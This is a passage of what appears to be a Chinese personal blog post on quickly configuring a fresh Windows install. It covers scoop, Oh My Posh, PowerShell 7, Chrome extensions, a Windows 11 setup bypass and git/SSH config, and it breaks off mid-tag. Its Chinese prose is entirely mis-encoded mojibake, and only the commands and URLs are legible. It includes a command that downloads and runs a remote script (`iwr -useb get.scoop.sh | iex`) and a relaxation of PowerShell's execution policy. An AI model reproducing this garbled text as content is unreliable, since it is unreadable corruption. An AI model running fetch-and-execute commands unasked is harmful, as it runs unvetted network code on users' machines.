    <content type="html"><![CDATA[<p><img src="/image/win_1.png"></p><p>æœ€è¿‘é¢‘ç¹çš„é‡è£…ç³»ç»Ÿï¼Œç»å¸¸ä¼šé‡åˆ°æ‹¿åˆ°ä¸€ä¸ªæ–°æœºå™¨ä½†æ˜¯ä¸è¶æ‰‹çš„æƒ…å†µã€‚ç”±äºæ¯æ¬¡éƒ½ä¼šåšé‡å¤çš„å·¥ä½œï¼Œå¹²è„†å†™ä¸€ç¯‡åšå®¢ï¼Œå°±å«åš<strong>ä»é›¶å¼€å§‹çš„Windowså¿«é€Ÿé…ç½®</strong>å¥½äº†</p><h1 id="è½¯ä»¶å®‰è£…"><a href="#è½¯ä»¶å®‰è£…" class="headerlink" title="è½¯ä»¶å®‰è£…"></a>è½¯ä»¶å®‰è£…</h1><h2 id="å¼€å‘å¿…å¤‡"><a href="#å¼€å‘å¿…å¤‡" class="headerlink" title="å¼€å‘å¿…å¤‡"></a>å¼€å‘å¿…å¤‡</h2><ul><li><a href="https://scoop.sh/">scoop</a><ul><li>winçš„åŒ…ç®¡ç†å·¥å…·</li><li>å¯ä»¥ä¸€è¡Œå‘½ä»¤è£…è½¯ä»¶ï¼Œå†ä¹Ÿä¸ç”¨ç‚¹wizardä¸­çš„ä¸‹ä¸€æ­¥å•¦</li></ul></li><li>vscode<ul><li>åœ°è¡¨æœ€å¼ºç¼–è¾‘å™¨ï¼Œå…·æœ‰ä¸°å¯Œçš„æ‹“å±•ï¼Œæ‹“å±•æ’ä»¶æ”¯æŒä½¿ç”¨è´¦å·åŒæ­¥</li></ul></li><li><a href="https://git-scm.com/download/win">git</a> <ul><li>æœ€æµè¡Œçš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·</li></ul></li><li><a href="https://github.com/2dust/v2rayN/releases">v2rayN</a><ul><li>å¯èƒ½æ˜¯winä¸Šæœ€æ–¹ä¾¿çš„å¯è§†åŒ–ç§‘å­¦ä¸Šç½‘è½¯ä»¶ï¼ˆclashä¸æœï¼‰</li></ul></li><li>wsl2<ul><li>ä½¿ä½ åœ¨Windowsä¸Šä½¿ç”¨Linuxï¼ˆä½†æ˜¯ä¼šè®©ä½ çš„Windowså˜æˆè™šæ‹Ÿæœºï¼Œæ…é‡ï¼‰</li><li><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">ç‚¹è¿™ä¸ªæ›´æ–°å†…æ ¸ä»¥é¿å…æŠ¥é”™</a></li></ul></li><li><a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">VMware Workstation Pro</a><ul><li>ä½¿ç”¨VMwareæ„å»ºå…·æœ‰å®Œæ•´å†…æ ¸çš„è™šæ‹Ÿæœº</li><li>ä¸<a href="https://releases.ubuntu.com/jammy/">Ubuntué•œåƒ</a>ä¸€åŒé£Ÿç”¨</li></ul></li><li><a href="https://rufus.ie/zh/">rufus</a><ul><li>ä¼˜é›…ç®€å•çš„çƒ§ç³»ç»Ÿé•œåƒ</li></ul></li></ul><h2 id="ç”Ÿäº§åŠ›å·¥å…·"><a href="#ç”Ÿäº§åŠ›å·¥å…·" class="headerlink" title="ç”Ÿäº§åŠ›å·¥å…·"></a>ç”Ÿäº§åŠ›å·¥å…·</h2><ul><li><a href="https://diskanalyzer.com/download">WizTree</a><ul><li>ç£ç›˜åˆ†æå·¥å…·&amp;å¤§æ–‡ä»¶å¯è§†åŒ–</li><li>å®‰è£…åŒ…ä»…4.5MB</li></ul></li><li><a href="https://ditto-cp.sourceforge.io/">Ditto</a><ul><li>ä¸€ä¸ªå°å·§è½»ä¾¿çš„å‰ªåˆ‡æ¿å·¥å…·</li><li>é»˜è®¤<code>ctrl+~</code>æ‰“å¼€å†å²å‰ªåˆ‡æ¿çª—å£</li></ul></li><li><a href="https://www.zotero.org/download/">zotero</a><ul><li>8è¯´äº†ï¼Œç§‘ç ”å¿…å¤‡</li></ul></li><li><a href="https://www.teamviewer.com/en-us/download/windows/">teamview</a><ul><li>è¿œæ§</li></ul></li><li>geekuninstaller<ul><li>å¸è½½å·¥å…·ï¼Œå¼ºå¤§ç²¾æ‚</li></ul></li><li>powertoys<ul><li>ä¸€ç³»åˆ—ç”Ÿäº§åŠ›å·¥å…·é›†åˆï¼Œæ¯”å¦‚é˜²æ­¢ä¼‘çœ ï¼Œå¿«é€Ÿé¢„è§ˆæ–‡ä»¶ï¼Œfancyzoneçª—å£å¸ƒå±€ç­‰</li></ul></li><li>chrome <ul><li>ä¸ç”¨æˆ‘å¤šè¯´äº†å§</li><li>æ’ä»¶æ˜¯çµé­‚</li></ul></li></ul><p><img src="https://img.gls.show/img/20230727200239.png"></p><ul><li><a href="https://www.sumatrapdfreader.org/free-pdf-reader">sumatra pdf</a><ul><li>è½»é‡åŒ–PDFé˜…è¯»å™¨ï¼Œå®‰è£…åŒ…åªæœ‰å‡ MBå¤§å°</li></ul></li><li><a href="https://crystalmark.info/en/download/">CrystalDiskMark| CrystalDiskInfo </a><ul><li>ç£ç›˜æµ‹é€Ÿã€æŸ¥çœ‹ç£ç›˜ä¿¡æ¯</li></ul></li><li><a href="https://www.diskgenius.com/download.php">diskgenius</a><ul><li>æ•°æ®æ¢å¤ã€èµ„æ–™å¤‡ä»½è¿˜åŸåŠç£ç›˜åˆ†å‰²ç®¡ç†</li></ul></li><li><a href="https://filezilla-project.org/download.php#close">FileZilla </a><ul><li>å¯è§†åŒ–ftpä¼ è¾“</li></ul></li><li><a href="https://www.foobar2000.org/download">foobar2000</a><ul><li>å¼€æºçš„é«˜éŸ³è´¨éŸ³ä¹æ’­æ”¾å™¨</li></ul></li><li><a href="https://obsproject.com/download">obs</a><ul><li>å¼€æºçš„å½•å±è½¯ä»¶</li></ul></li><li><a href="https://www.cpuid.com/downloads/cpu-z/cpu-z_1.79-en.exe?utm_mediu">cpuid</a><ul><li>æŸ¥çœ‹CPUä¿¡æ¯</li></ul></li><li><a href="https://transmissionbt.com/download">transmission</a><ul><li>btã€ptå®¢æˆ·ç«¯</li></ul></li><li><a href="https://www.voidtools.com/zh-cn/downloads/">everything</a><ul><li>é«˜é€Ÿç´¢å¼•ç³»ç»Ÿä¸Šçš„æ‰€æœ‰æ–‡ä»¶</li></ul></li><li><a href="https://7-zip.org/download.html">7-zip</a><ul><li>å¼€æºç²¾å·§çš„å‹ç¼©è½¯ä»¶</li></ul></li><li><a href="https://www.foxmail.com/">foxmail</a><ul><li>ä¼˜ç§€çš„ç¬¬ä¸‰æ–¹é‚®ä»¶å®¢æˆ·ç«¯ï¼Œæ— å¹¿å‘Šã€ç¨³å®š</li></ul></li><li><a href="https://shurufa.sogou.com/">æœç‹—è¾“å…¥æ³•</a><ul><li>ç”¨éšç§æ¢ä¾¿åˆ© : (</li></ul></li><li><a href="https://obsidian.md/">obsidian</a><ul><li>è¿™ä¸ªç¬”è®°è½¯ä»¶çœŸçš„æ˜¯å¤ªå¼ºäº†ï¼Œéšä¾¿ä¸€ä¸ªåŠŸèƒ½èƒ½è¯´åŠå¤©</li></ul></li><li>typora<ul><li>å…¥æ‰‹æœ€ç®€å•çš„mdç¼–è¾‘å™¨</li></ul></li><li><a href="https://mathpix.com/">mathpix</a><ul><li>ocrè¯†å›¾æˆlatexå…¬å¼</li></ul></li><li><a href="https://zh.snipaste.com/">Snipaste</a><ul><li>å°å·§çš„æˆªå±è½¯ä»¶</li></ul></li><li><a href="https://geekuninstaller.com/download">geek</a><ul><li>ä¸“æ³¨æ–‡ä»¶å¸è½½ï¼Œå¯ä»¥å¸æ‰è½¯ä»¶æ®‹ä½™å’Œstoreä¸‹è½½çš„æ–‡ä»¶</li></ul></li></ul><p>ä»å¾®è½¯çš„å®˜æ–¹storeå¯ä»¥ä¸‹è½½çš„å¥½ä¸œè¥¿ï¼š</p><ul><li>todo</li><li>pwsh</li><li>wsl2</li><li>snipaste</li><li><a href="https://apps.microsoft.com/store/detail/quicklook/9NV4BS3L1H4S">QuickLook</a></li></ul><p>å£çº¸ï¼š</p><ul><li><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></li><li><a href="https://unsplash.com/">https://unsplash.com/</a></li><li>Steam ä¸Šçš„ wallpaper engineï¼Œä¿—ç§°å°çº¢è½¦</li></ul><h1 id="æ—¶é—´çº¿"><a href="#æ—¶é—´çº¿" class="headerlink" title="æ—¶é—´çº¿"></a>æ—¶é—´çº¿</h1><p>æ‹¿åˆ°æ–°ç”µè„‘ï¼Œå¼€æœºï¼Œä¸‹è½½é²å¤§å¨˜ï¼Œæ›´æ–°é©±åŠ¨</p><p>åœ¨å¾®è½¯å•†åº—ä¸‹è½½pwshã€Windows terminalï¼ˆwtï¼‰ï¼Œåœ¨wtä¸­è®¾ç½®pwshä¸ºé»˜è®¤</p><p>åœ¨pwshä¸­å®‰è£…scoopï¼š<code>iwr -useb get.scoop.sh | iex</code>ï¼Œå‘ç°æ²¡é€Ÿåº¦ã€‚éœ€è¦ç§‘å­¦ä¸Šç½‘æ‰èƒ½ä½¿ç”¨scoopå‘½ä»¤ï¼Œä¸ºäº†ç§‘å­¦ä¸Šç½‘åˆéœ€è¦ä¸Šgithubä¸‹è½½v2rayï¼Œè€Œä¸ºäº†ä¸Šgithubåˆéœ€è¦æ›´æ”¹host</p><p>ä¿®æ”¹hostï¼Œä½¿å¾—èƒ½è¿›å…¥githubï¼Œè¿™æ—¶å€™éœ€è¦ä¿®æ”¹hostæ‰‹åŠ¨å°†githubåŸŸåæ˜ å°„åˆ°ipã€‚</p><ul><li>ä¸ºäº†æ–¹ä¾¿æ‰¾åˆ°hostsæ–‡ä»¶ï¼Œä¸‹è½½äº†everything</li></ul><p>è¿›å…¥GitHubï¼Œä¸‹è½½v2ray ï¼š<a href="https://github.com/2dust/v2rayN">https://github.com/2dust/v2rayN</a></p><p>åœ¨è®¾ç½®ä¸­é…ç½®å¥½v2rayï¼ˆç™»å½•å¾®ä¿¡æ–‡ä»¶ä¼ è¾“åŠ©æ‰‹å‘é€å¹¶å¯¼å…¥è®¢é˜…ï¼‰</p><ul><li>é…ç½®ç«¯å£</li><li>é…ç½®å±€åŸŸç½‘è¿æ¥</li></ul><p>è®¿é—®Googleæœç´¢å¼•æ“ï¼Œå¹¶åŒæ­¥chromeæµè§ˆå™¨</p><p>ç›´æ¥ä½¿ç”¨scoop searchä¼šæœ‰ç‚¹æ…¢ï¼Œå¯ä»¥å®‰è£…scoop-searchï¼Œè¿™ä¸ªå‘½ä»¤åŠ å¿«æœç´¢é€Ÿåº¦</p><p><strong>æ­£æˆå¼€å§‹ï¼Œscoopä¸€æŠŠæ¢­ï¼Œç›´æ¥è£…å¤©è£…åœ°</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">install </span>vscode zotero rufus <span class="hljs-keyword">ditto </span>teamviewer sumatrapdf filezilla crystaldiskmark crystaldiskinfo foxmail obsidian mathpix geekuninstaller snipaste quicklook potplayer<br></code></pre></td></tr></table></figure><ul><li>vscode</li><li>wiztree</li><li>geekuninstaller</li><li>zotero</li><li>rufus</li><li>ditto</li><li>teamviewer</li><li>sumatrapdf</li><li>filezilla</li><li>crystaldiskmark</li><li>crystaldiskinfo</li><li>foxmail obsidian  mathpix geekuninstaller snipaste quicklook potplayer</li></ul><blockquote><p>ä¸ºäº†è¿ç§»æ–¹ä¾¿ï¼Œæ–‡ä»¶å»ºè®®æ”¾åœ¨useræ–‡ä»¶å¤¹ä¸­ï¼ˆWindowsç³»ç»Ÿå¯ä»¥é€‰æ‹©é‡è£…ç³»ç»Ÿä½†æ˜¯ä¸åˆ é™¤ç”¨æˆ·æ•°æ®ï¼Œä¹Ÿå³useræ–‡ä»¶å¤¹ä¸­çš„æ•°æ®ï¼‰ã€‚è€Œscoopçš„é»˜è®¤ä¸‹è½½çš„è·¯å¾„å°±åœ¨useræ–‡ä»¶å¤¹ä¸­ï¼Œè€Œä¸æ˜¯<code>C:/Programe Files</code>ã€‚å› æ­¤ä½¿ç”¨scoopå®‰è£…å¯ä»¥ä¾¿äºç³»ç»Ÿè¿ç§»</p></blockquote><h1 id="pwshç¾åŒ–"><a href="#pwshç¾åŒ–" class="headerlink" title="pwshç¾åŒ–"></a>pwshç¾åŒ–</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>å®‰è£…Oh My Posh</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">winget install JanDeDobbeleer.OhMyPosh <span class="hljs-literal">-s</span> winget  <span class="hljs-comment"># æ–¹æ³•2</span><br><br>scoop install main/<span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> <span class="hljs-comment"># æ–¹æ³•2</span><br></code></pre></td></tr></table></figure><p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥code $profileï¼Œä¼šæ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œåœ¨å…¶ä¸­è¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> init pwsh -<span class="hljs-literal">-config</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:POSH_THEMES_PATH</span>/M365Princess.omp.json&quot;</span> | <span class="hljs-built_in">Invoke-Expression</span><br></code></pre></td></tr></table></figure><p>ä¿å­˜ï¼Œé‡å¯pwshï¼Œå‘ç°æŠ¥é”™</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">æ— æ³•åŠ è½½æ–‡ä»¶ C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>hilo<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>icrosoft.PowerShell_profile.ps1ï¼Œå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šç¦æ­¢è¿è¡Œè„š<br>æœ¬ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… https:/go.microsoft.com/fwlink/?LinkID=135170 ä¸­çš„ about_Execution_Policiesã€‚<br></code></pre></td></tr></table></figure><p>åœ¨ç®¡ç†å‘˜shellä¸­æ›´æ”¹ç­–ç•¥ä¸ºRemoteSigned</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">set-ExecutionPolicy</span> <span class="hljs-string">RemoteSigned</span><br><br><span class="hljs-built_in">get-ExecutionPolicy</span> <span class="hljs-comment"># RemoteSigned</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒOh My Poshå®‰è£…å®Œæˆï¼Œå¯ä»¥é€šè¿‡Get-PoshThemeså‘½ä»¤è¾“å‡ºæ‰€æœ‰çš„ä¸»é¢˜</p><p><img src="https://img.gls.show/img/20230727201353.png"></p><p>ä½†æ˜¯ï¼Œç”±äºæ­¤æ—¶è¿˜æ²¡æœ‰å®‰è£…å­—ä½“ï¼Œå› æ­¤å¯èƒ½ä¼šå‡ºç°å›¾æ ‡æ˜¾ç¤ºä¸å®Œå…¨çš„ç°è±¡</p><p>åœ¨å¦‚ä¸‹ç½‘ç«™å®‰è£…å­—ä½“ï¼Œç›´æ¥downloadå³å¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.nerdfonts.com/font-downloads<br></code></pre></td></tr></table></figure><p>ä¸‹è½½å®Œæˆåä¼šæœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹åè¿›å…¥æ–‡ä»¶å¤¹åŒå‡»æ–‡ä»¶å³å¯å®‰è£…å­—ä½“</p><p>åœ¨pwshçš„è®¾ç½®-ã€‹å¤–è§‚-ã€‹å­—ä½“ä¸­ï¼Œæ‰¾åˆ°å®‰è£…çš„å­—ä½“ï¼Œä¿å­˜ï¼Œé‡å¯pwshå³å¯</p><p>Microsoft.PowerShell_profile.ps1ä¸­å†™å…¥äº†æˆ‘ä»¬çš„ä¸»é¢˜ï¼Œæ¯”å¦‚åˆšåˆšè®¾ç½®äº†M365Princess.omp.jsonä½œä¸ºä¸»é¢˜ï¼Œä¹Ÿå¯ä»¥æ¢æˆå…¶ä»–çš„</p><h2 id="å‡çº§"><a href="#å‡çº§" class="headerlink" title="å‡çº§"></a>å‡çº§</h2><p>å¯ä»¥é€šè¿‡$psversiontableæŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼Œæˆ‘ç°åœ¨çš„ç‰ˆæœ¬æ˜¯5</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">$psversiontable<br><br>Name                           Value<br>----                           -----<br>PSVersion                      <span class="hljs-number">5.1.19041</span>.<span class="hljs-number">3031</span><br>PSEdition                      Desktop<br>PSCompatibleVersions           &#123;<span class="hljs-number">1</span>.<span class="hljs-number">0</span>, <span class="hljs-number">2</span>.<span class="hljs-number">0</span>, <span class="hljs-number">3</span>.<span class="hljs-number">0</span>, <span class="hljs-number">4</span>.<span class="hljs-number">0</span>...&#125;<br>BuildVersion                   <span class="hljs-number">10.0.19041</span>.<span class="hljs-number">3031</span><br>CLRVersion                     <span class="hljs-number">4.0.30319</span>.<span class="hljs-number">42000</span><br>WSManStackVersion              <span class="hljs-number">3</span>.<span class="hljs-number">0</span><br>PSRemotingProtocolVersion      <span class="hljs-number">2</span>.<span class="hljs-number">3</span><br>SerializationVersion           <span class="hljs-number">1.1.0.1</span><br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ä¸€ä¸‹å¯ç”¨ç‰ˆæœ¬</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> winget search powershell</span><br>â€œmsstoreâ€æºè¦æ±‚åœ¨ä½¿ç”¨å‰æŸ¥çœ‹ä»¥ä¸‹åè®®ã€‚<br>Terms of Transaction: https://aka.ms/microsoft-store-terms-of-transaction<br><br>æ˜¯å¦åŒæ„æ‰€æœ‰æºåè®®æ¡æ¬¾?<br>[Y] æ˜¯  [N] å¦: Y<br><span class="hljs-section">åç§°                                 ID                                          ç‰ˆæœ¬         åŒ¹é…            æº</span><br><span class="hljs-section">---------------------------------------------------------------------------------------------------------------------</span><br>PowerShell                           9MZ1SNWT0N5D                                Unknown                      msstore<br>PowerShell Preview                   9P95ZZKTNRN4                                Unknown                      msstore<br>PowerShell to exe&amp;msi Converter free XPDCHZH119SRT8                              Unknown                      msstore<br>PowerShell Conference Asia 2015      9WZDNCRD37D8                                Unknown                      msstore<br>PowerShell                           Microsoft.PowerShell                        7.3.6.0                      winget<br>PowerSession                         Watfaq.PowerSession                         0.1.7        Tag: powershell winget<br>Windows Terminal Preview             Microsoft.WindowsTerminal.Preview           1.17.10234.0 Tag: PowerShell winget<br>Windows Terminal                     Microsoft.WindowsTerminal                   1.16.10261.0 Tag: powershell winget<br>PowerShell Preview                   Microsoft.PowerShell.Preview                7.4.0.4      Tag: powershell winget<br><br></code></pre></td></tr></table></figure><p>å®‰è£…7ç‰ˆæœ¬çš„pwsh</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">winget <span class="hljs-keyword">install</span> Microsoft.PowerShell<br></code></pre></td></tr></table></figure><p>å®‰è£…ä¹‹åï¼ŒåŸå…ˆç‰ˆæœ¬å’Œæ–°ç‰ˆä¼šå…±å­˜</p><p>æ‰“å¼€è®¾ç½®ï¼Œå°†é»˜è®¤é€‰é¡¹å¡è®¾ç½®ä¸ºpwsh7å³å¯</p><h2 id="ç¾åŒ–"><a href="#ç¾åŒ–" class="headerlink" title="ç¾åŒ–"></a>ç¾åŒ–</h2><p>æ•ˆæœå›¾ï¼š</p><p><img src="https://img.gls.show/img/20230726221250.png"></p><p>å®‰è£…æ¨¡å—ç¾åŒ–å›¾æ ‡æ˜¾ç¤ºï¼š</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Install</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">Terminal</span><span class="hljs-operator">-</span><span class="hljs-variable">Icons</span><br></code></pre></td></tr></table></figure><p>åœ¨$profileä¸­å†™å…¥é…ç½®</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">oh</span><span class="hljs-literal">-my</span><span class="hljs-literal">-posh</span> init pwsh -<span class="hljs-literal">-config</span> <span class="hljs-string">&quot;<span class="hljs-variable">$env:POSH_THEMES_PATH</span>/amro.omp.json&quot;</span> | <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-comment">#è®¾ç½®ä¸»é¢˜</span><br><br><span class="hljs-built_in">Set-PSReadlineKeyHandler</span> <span class="hljs-literal">-Key</span> Tab <span class="hljs-literal">-Function</span> MenuComplete <span class="hljs-comment">#è¡¥å…¨</span><br><br><span class="hljs-built_in">Import-Module</span> Terminal<span class="hljs-literal">-Icons</span> <span class="hljs-comment">#ç¾åŒ–å›¾æ ‡</span><br></code></pre></td></tr></table></figure><h1 id="chromeæ’ä»¶æ¨è"><a href="#chromeæ’ä»¶æ¨è" class="headerlink" title="chromeæ’ä»¶æ¨è"></a>chromeæ’ä»¶æ¨è</h1><ul><li><p>Switch OMEGA</p><ul><li>è½»æ¾å¿«æ·åœ°ç®¡ç†å’Œåˆ‡æ¢å¤šä¸ªä»£ç†è®¾ç½®</li><li>é…åˆè¿™ä¸ªä¸€åŒé£Ÿç”¨<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a></li></ul></li><li><p>adblock</p><ul><li>æœ€ä½³å¹¿å‘Šæ‹¦æˆªå·¥å…·</li></ul></li><li><p>chathub</p><ul><li>åŒæ—¶ä½¿ç”¨ChatGPT, Bing, Bardå’Œæ›´å¤šæœºå™¨äºº</li></ul></li><li><p>onetab</p><ul><li>æ›´å¥½çš„æ ‡ç­¾é¡µç®¡ç†</li></ul></li><li><p>YouTubeâ„¢ åŒå­—å¹•</p><ul><li>è‡ªåŠ¨åˆ‡æ¢åˆ°æœ¬åœ°è¯­è¨€ï¼ŒåŒè¯­å­—å¹•ï¼Œå­—å¹•ä¸‹è½½ï¼Œå­—å¹•é…éŸ³ï¼Œè‡ªå®šä¹‰å­—å¹•æ ·å¼ã€‚</li></ul></li><li><p>æ²™æ‹‰æŸ¥è¯-èšåˆè¯å…¸åˆ’è¯ç¿»è¯‘</p><ul><li>ç½‘é¡µåˆ’è¯ç¿»è¯‘ï¼Œæ”¯æŒå¤šä¸ªç¿»è¯‘æº</li></ul></li></ul><h1 id="Windowsç³»ç»Ÿä¸å¯ä¸çŸ¥çš„å¿«æ·é”®"><a href="#Windowsç³»ç»Ÿä¸å¯ä¸çŸ¥çš„å¿«æ·é”®" class="headerlink" title="Windowsç³»ç»Ÿä¸å¯ä¸çŸ¥çš„å¿«æ·é”®"></a>Windowsç³»ç»Ÿä¸å¯ä¸çŸ¥çš„å¿«æ·é”®</h1><ul><li>win+aï¼Œæ‰“å¼€ç®¡ç†ä¸­å¿ƒ</li><li>win+dï¼Œå›åˆ°æ¡Œé¢</li><li>win+Lï¼Œé”å®šå±å¹•</li><li>win+æ–¹å‘é”®ï¼Œåˆ†å±</li><li>win+mï¼Œæœ€å°åŒ–æ‰€æœ‰çª—å£</li><li>win+eï¼Œæ‰“å¼€èµ„æºç®¡ç†å™¨</li><li>Shift + Deleteï¼šæ°¸ä¹…åˆ é™¤æ–‡ä»¶</li><li>Alt + Dï¼šé€‰ä¸­åœ°å€æ </li><li>Ctrl+é¼ æ ‡æ‹–åŠ¨ï¼šå¤åˆ¶æ–‡ä»¶è€Œä¸æ˜¯ç§»åŠ¨æ–‡ä»¶</li></ul><h1 id="æ­£ç‰ˆWindowsç³»ç»Ÿå®‰è£…"><a href="#æ­£ç‰ˆWindowsç³»ç»Ÿå®‰è£…" class="headerlink" title="æ­£ç‰ˆWindowsç³»ç»Ÿå®‰è£…"></a>æ­£ç‰ˆWindowsç³»ç»Ÿå®‰è£…</h1><p>å®‰è£…Windowsä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹å¼ï¼š</p><ul><li>åœ¨å„å¤§é«˜æ ¡æ­£ç‰ˆè½¯ä»¶ä¸­ä¸‹è½½ã€æ¨èã€‘</li><li>åœ¨tbä¹°æ¿€æ´»ç ã€ä¸€èˆ¬åªèƒ½è£…ä¸€æ¬¡ï¼Œåå—é’±å·¦å³ã€‘</li><li>ç ´è§£ç‰ˆã€ä¸æ¨èï¼Œä¸å®‰å…¨ã€‘</li></ul><p>å»ºè®®ä½¿ç”¨rufusåˆ¶ä½œç³»ç»Ÿå¯åŠ¨uç›˜</p><p>å…³äºwin11è›‹ç–¼çš„å¿…é¡»è”ç½‘å’Œåˆ›å»ºMicrosoftç”¨æˆ·æ‰èƒ½è¿›å…¥ç³»ç»Ÿçš„é—®é¢˜ï¼š</p><ul><li>ç»•è¿‡è”ç½‘ï¼šshift+f10æ‰“å¼€å‘½ä»¤è¡Œï¼Œåœ¨å…¶ä¸­è¾“å…¥OOBE\BYPASSNROï¼Œç”µè„‘ä¼šè‡ªåŠ¨é‡å¯ï¼Œå¹¶ä¸”ä¸ä¼šå¼€æœºè¿è¡Œoobeï¼ˆout of box experienceï¼‰æœåŠ¡</li><li>å¿…é¡»åˆ›å»ºMicrosoftç”¨æˆ·ï¼šæŠŠç½‘çº¿æ‹”äº†å°±ä¸ä¼šé‡åˆ°è¿™ä¸ªé—®é¢˜</li></ul><h1 id="é…ç½®-github-git-ssh"><a href="#é…ç½®-github-git-ssh" class="headerlink" title="é…ç½® github | git | ssh"></a>é…ç½® github | git | ssh</h1><h2 id="æœ¬åœ°git-sshè®¾ç½®"><a href="#æœ¬åœ°git-sshè®¾ç½®" class="headerlink" title="æœ¬åœ°git sshè®¾ç½®"></a>æœ¬åœ°git sshè®¾ç½®</h2><p>é¦–å…ˆä¸‹è½½<a href="https://git-scm.com/download/win">git</a>ï¼Œä¹‹ååœ¨userç›®å½•ä¸‹ä¼šæœ‰.sshæ–‡ä»¶å¤¹</p><p><img src="https://img.gls.show/img/20230727203941.png"></p><ul><li><p>known_hosts å­˜å‚¨å·²çŸ¥çš„è¿œç¨‹ä¸»æœºçš„å…¬é’¥æŒ‡çº¹ã€‚å½“é¦–æ¬¡è¿æ¥åˆ°è¿œç¨‹ä¸»æœºæ—¶ï¼ŒSSHå®¢æˆ·ç«¯ä¼šå°†å…¶å…¬é’¥æŒ‡çº¹ä¿å­˜åœ¨<code>known_hosts</code>æ–‡ä»¶ä¸­</p></li><li><p>è¿™é‡Œwdnmdå’Œzaraæ˜¯ç§é’¥</p><ul><li>ä¸ºäº†å®‰å…¨çš„è¿æ¥åˆ°è¿œç¨‹ï¼Œéœ€è¦ä½¿ç”¨<code>ssh-keygen</code>å‘½ä»¤ç”Ÿæˆå…¬ç§é’¥å¯¹ï¼Œ æ¯”å¦‚åç§°ä¸º<code>id_rsa</code>å’Œ<code>id_rsa.pub</code></li><li>æˆ‘ä»¬éœ€è¦åœ¨è¿œç¨‹ä¸»æœºä¸­çš„authorized_keysä¸­å†™å…¥id_rsa.pubçš„å€¼ï¼Œç„¶åå°†id_rsaæ–‡ä»¶ä¿ç•™åœ¨æˆ‘ä»¬æœ¬åœ°çš„.sshç›®å½•ä¸‹</li></ul></li><li><p><code>config</code>æ˜¯SSHå®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰SSHè¿æ¥çš„è¡Œä¸ºå’Œé€‰é¡¹</p></li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">  Host github.com <span class="hljs-comment"># è®¾å®šä¸»æœºåˆ«å</span><br>  Hostname ssh.github.com<br>  IdentityFile <span 